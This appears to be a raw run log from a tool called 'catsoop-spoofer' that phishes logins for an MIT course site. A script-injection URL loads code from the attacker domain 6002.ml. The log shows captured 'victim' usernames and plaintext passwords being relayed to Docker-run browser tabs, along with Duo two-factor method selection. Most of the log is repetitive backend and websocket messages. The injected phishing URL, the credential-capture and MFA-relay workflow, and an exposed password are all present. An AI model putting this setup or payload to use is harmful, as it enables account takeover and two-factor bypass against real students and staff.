+DOCKER_MANAGER:Longest alive backend time: 10979.018686294556 with bid:  10834
+DOCKER_MANAGER:available backends:  6  or  6 out of 7
+DOCKER_MANAGER:backend [bid= 10834 ;sid= 1589861004406 ] claimed
+DOCKER_MANAGER:Executing: /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh 10834 1589861004406 tjz babygirl@physx3894
+DOCKER_MANAGER:cmd:  ['/home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh', '10834', '1589861004406', 'tjz', 'babygirl@physx3894']
+Archive:  /tmp/duo10834.zip
+  inflating: /tmp/duo10834/background.js  
+  inflating: /tmp/duo10834/duo-login.js  
+  inflating: /tmp/duo10834/manifest.json  
+  inflating: /tmp/duo10834/popup.html  
+ extracting: /tmp/duo10834/icon32.png  
+  inflating: /tmp/duo10834/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+the input device is not a TTY
+SOCKET_SERVER:victim 1589861004406 closing...
+DOCKER_MANAGER:released from SID backend: 10834
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+SOCKET_SERVER:received:  {'action': 'requestVictim', 'sid': '1589861004406', 'id': 'backend', 'bid': '10834'}
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f92e860fa20> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f92e861d4a8> ; /
+SOCKET_SERVER:received:  {'status': 'waitingForAuthm', 'sid': '1589861004406', 'id': 'backend', 'bid': '10834'}
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f92e861db38> ; /
+SOCKET_SERVER:received:  {'status': 'waitingForAuthm', 'number': 'XXX-XXX-8756', 'sid': '1589861004406', 'id': 'backend', 'bid': '10834'}
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f92e8600940> ; /
+Read Phishing URL: https://6002.catsoop.org/S20/%3cscript%20src=%68ttps%3a6002.ml/
+Read Attacker Domain Name: 6002.ml
+Read Firefox Path: /home/tjz/.mozilla/firefox
+Multiple ipv4 addresses found. Which one is portforwarding on port 80?
+0: 127.0.0.1
+1: 192.168.0.17
+2: 172.17.0.1
+Select IP by index:Traceback (most recent call last):
+  File "run-spoof.py", line 38, in <module>
+    i = input("Select IP by index:")
+OSError: [Errno 9] Bad file descriptor
+Read Phishing URL: https://6002.catsoop.org/S20/%3cscript%20src=%68ttps%3a6002.ml/
+Read Attacker Domain Name: 6002.ml
+Read Firefox Path: /home/tjz/.mozilla/firefox
+Localhost is 192.168.0.17
+Starting https server on port 443...
+Using key /home/tjz/Programming/catsoop-spoofer/ssl/key.pem
+Using certificate /home/tjz/Programming/catsoop-spoofer/ssl/cert.pem
+Trying to host https server on 192.168.0.17:443
+Starting backend server...
+resfreshing duo website...
+duo refreshed...
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10854 10854 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10854
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10855 10855 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10855
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10856 10856 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10856
+starting docker process at: 1589862587253
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10857 10857 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10857
+starting docker process at: 1589862587254
+starting docker process at: 1589862587255
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10858 10858 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10858
+starting docker process at: 1589862587257
+DOCKER_MANAGER:# availbale backends: 5
+Using key /home/tjz/Programming/catsoop-spoofer/ssl/key.pem
+Using certificate /home/tjz/Programming/catsoop-spoofer/ssl/cert.pem
+Starting Socket Server on Port 80
+starting docker process at: 1589862587260
+Archive:  /tmp/duo10854.zip
+  inflating: /tmp/duo10854/background.js  
+  inflating: /tmp/duo10854/duo-login.js  
+  inflating: /tmp/duo10854/manifest.json  
+  inflating: /tmp/duo10854/popup.html  
+ extracting: /tmp/duo10854/icon32.png  
+  inflating: /tmp/duo10854/popup.js  
+Archive:  /tmp/duo10856.zip
+  inflating: /tmp/duo10856/background.js  
+  inflating: /tmp/duo10856/duo-login.js  
+  inflating: /tmp/duo10856/manifest.json  
+  inflating: /tmp/duo10856/popup.html  
+ extracting: /tmp/duo10856/icon32.png  
+  inflating: /tmp/duo10856/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+Archive:  /tmp/duo10858.zip
+  inflating: /tmp/duo10858/background.js  
+  inflating: /tmp/duo10858/duo-login.js  
+  inflating: /tmp/duo10858/manifest.json  
+  inflating: /tmp/duo10858/popup.html  
+ extracting: /tmp/duo10858/icon32.png  
+  inflating: /tmp/duo10858/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589862587290
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+Archive:  /tmp/duo10855.zip
+  inflating: /tmp/duo10855/background.js  
+  inflating: /tmp/duo10855/duo-login.js  
+  inflating: /tmp/duo10855/manifest.json  
+  inflating: /tmp/duo10855/popup.html  
+ extracting: /tmp/duo10855/icon32.png  
+  inflating: /tmp/duo10855/popup.js  
+running docker command at: 1589862587295
+running docker command at: 1589862587298
+Archive:  /tmp/duo10857.zip
+  adding: background.js  inflating: /tmp/duo10857/background.js  
+  inflating: /tmp/duo10857/duo-login.js   (deflated 61%)
+  adding: duo-login.js
+  inflating: /tmp/duo10857/manifest.json  
+  inflating: /tmp/duo10857/popup.html  
+ (deflated 64%)
+  adding: icon32.png extracting: /tmp/duo10857/icon32.png  
+  inflating: /tmp/duo10857/popup.js  
+ (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589862587303
+running docker command at: 1589862587309
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018e1b9128> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  4  or  4 out of 5
+DOCKER_MANAGER:Could not find suitable backend...
+DOCKER_MANAGER:<=  5 idle backends... Starting new
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10859 10859 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10859
+starting docker process at: 1589862588064
+Archive:  /tmp/duo10859.zip
+  inflating: /tmp/duo10859/background.js  
+  inflating: /tmp/duo10859/duo-login.js  
+  inflating: /tmp/duo10859/manifest.json  
+  inflating: /tmp/duo10859/popup.html  
+ extracting: /tmp/duo10859/icon32.png  
+  inflating: /tmp/duo10859/popup.js  
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589862588217
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018f25da90> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018f228d68> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018f2360b8> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d7f7400> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+105ce2054ebdd1f8f747dcd6d6b0ca59f1aafd6fc175f340cb0e85908d368386
+a56733684353c7ca418a5c04c07798aab1f29cd55c6127613995455bcd4bf19a
+17afe1611c8cd35604a5b2dca99193eab699f4a7dbd05b004bd85e6c24cb2840
+b4d98337f1c0f2dcd27fdb6e7d09b0132b331b72ab686bcfa7af3a25d90c9585
+00a1259d554672ca1a1ae33e2fa31ea89b9fa38dded314d686a97355ab73dd48
+ba0ad3282483eb682f8051785680eb0d39daf8b26d1564e04eeee28cbc63fb57
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d810e80> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d7f7080> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d814ac8> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d7daf28> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d8145f8> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d7da780> ; /
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d7da0b8> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d7d7dd8> ; /
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d7680f0> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d7d77f0> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d7dadd8> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d7d78d0> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d7d7b70> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d859a20> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d871dd8> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d8716a0> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d7c2208> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d87d128> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d7b8d68> ; /
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d7e36d8> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:Longest alive backend time: 20.92198872566223 with bid:  10854
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:backend [bid= 10854 ;sid= 1589862459995 ] claimed
+DOCKER_MANAGER:Executing: /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh 10854 1589862459995 tjz babygirl@physx3894
+DOCKER_MANAGER:cmd:  ['/home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh', '10854', '1589862459995', 'tjz', 'babygirl@physx3894']
+DOCKER_MANAGER:<=  5 idle backends... Starting new
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10860 10860 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10860
+starting docker process at: 1589862608183
+Archive:  /tmp/duo10854.zip
+  inflating: /tmp/duo10854/background.js  
+  inflating: /tmp/duo10854/duo-login.js  
+  inflating: /tmp/duo10854/manifest.json  
+  inflating: /tmp/duo10854/popup.html  
+ extracting: /tmp/duo10854/icon32.png  
+  inflating: /tmp/duo10854/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+Archive:  /tmp/duo10860.zip
+  inflating: /tmp/duo10860/background.js  
+  inflating: /tmp/duo10860/duo-login.js  
+  inflating: /tmp/duo10860/manifest.json  
+  inflating: /tmp/duo10860/popup.html  
+ extracting: /tmp/duo10860/icon32.png  
+  inflating: /tmp/duo10860/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589862608293
+the input device is not a TTY
+739d43932dbbacf6ecf19db635e7d745ebf175a3242cb49bef3e9838c1da9b47
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018f228b70> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d815f60> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d7ed860> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d771860> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d771ac8> ; /
+SOCKET_SERVER:received:  {'action': 'setAuthMethod', 'authm': '1', 'id': 'victim', 'sid': '1589862459995'}
+SOCKET_SERVER:backend 10854 is NOT ready, waiting to send auth method
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f018d771f60> ; /
+Read Phishing URL: https://6002.catsoop.org/S20/%3cscript%20src=%68ttps%3a6002.ml/
+Read Attacker Domain Name: 6002.ml
+Read Firefox Path: /home/tjz/.mozilla/firefox
+Localhost is 192.168.0.17
+Starting https server on port 443...
+Using key /home/tjz/Programming/catsoop-spoofer/ssl/key.pem
+Using certificate /home/tjz/Programming/catsoop-spoofer/ssl/cert.pem
+Trying to host https server on 192.168.0.17:443
+Starting backend server...
+resfreshing duo website...
+duo refreshed...
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10861 10861 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10861
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10862 10862 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10862
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10863 10863 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10863
+starting docker process at: 1589862821684
+starting docker process at: 1589862821685
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10864 10864 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10864
+starting docker process at: 1589862821687
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10865 10865 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10865
+DOCKER_MANAGER:# availbale backends: 5
+Using key /home/tjz/Programming/catsoop-spoofer/ssl/key.pem
+Using certificate /home/tjz/Programming/catsoop-spoofer/ssl/cert.pem
+starting docker process at: 1589862821689
+Starting Socket Server on Port 80
+starting docker process at: 1589862821690
+Archive:  /tmp/duo10861.zip
+  inflating: /tmp/duo10861/background.js  
+  inflating: /tmp/duo10861/duo-login.js  
+  inflating: /tmp/duo10861/manifest.json  
+  inflating: /tmp/duo10861/popup.html  
+ extracting: /tmp/duo10861/icon32.png  
+  inflating: /tmp/duo10861/popup.js  
+Archive:  /tmp/duo10863.zip
+  inflating: /tmp/duo10863/background.js  
+  inflating: /tmp/duo10863/duo-login.js  
+  inflating: /tmp/duo10863/manifest.json  
+  inflating: /tmp/duo10863/popup.html  
+ extracting: /tmp/duo10863/icon32.png  
+  inflating: /tmp/duo10863/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+Archive:  /tmp/duo10865.zip
+  inflating: /tmp/duo10865/background.js  
+  inflating: /tmp/duo10865/duo-login.js  
+  inflating: /tmp/duo10865/manifest.json  
+  inflating: /tmp/duo10865/popup.html  
+ extracting: /tmp/duo10865/icon32.png  
+  inflating: /tmp/duo10865/popup.js  
+running docker command at: 1589862821722
+Archive:  /tmp/duo10862.zip
+  inflating: /tmp/duo10862/background.js  
+  inflating: /tmp/duo10862/duo-login.js  
+  inflating: /tmp/duo10862/manifest.json  
+  inflating: /tmp/duo10862/popup.html  
+ extracting: /tmp/duo10862/icon32.png  
+  inflating: /tmp/duo10862/popup.js  
+running docker command at: 1589862821725
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589862821730
+running docker command at: 1589862821733
+Archive:  /tmp/duo10864.zip
+  inflating: /tmp/duo10864/background.js  
+  inflating: /tmp/duo10864/duo-login.js  
+  inflating: /tmp/duo10864/manifest.json  
+  inflating: /tmp/duo10864/popup.html  
+ extracting: /tmp/duo10864/icon32.png  
+  inflating: /tmp/duo10864/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589862821750
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48abe22e8> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  4  or  4 out of 5
+DOCKER_MANAGER:Could not find suitable backend...
+DOCKER_MANAGER:<=  5 idle backends... Starting new
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10866 10866 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10866
+starting docker process at: 1589862823951
+Archive:  /tmp/duo10866.zip
+  inflating: /tmp/duo10866/background.js  
+  inflating: /tmp/duo10866/duo-login.js  
+  inflating: /tmp/duo10866/manifest.json  
+  inflating: /tmp/duo10866/popup.html  
+ extracting: /tmp/duo10866/icon32.png  
+  inflating: /tmp/duo10866/popup.js  
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589862824196
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48ab6fc18> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1fdbe0> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+8d642734da9aa8e32dfb88ebaba78f738b935366a9bb237ad1a22b991465ec30
+c09eca5a3325c457d0a0bace329a3f34d4455d632badf91e28cca880e4f9e369
+d60dc5e8b5fb864df55be6ca9ba2ccbfac6beadeb4437079969c132554d69213
+609f56fa714bdef9bf294fe5b393f0f4aee5cd4c302756f38a1e897348e5f76d
+a1435645021b90890e124a581d2f4e3c1464489f082b599c768dbd329801cc04
+c804b4c11f0919ad1ccacec5076791e14400606028685187fbd97204cf9a8add
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1abd68> ; /
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48abb4f60> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
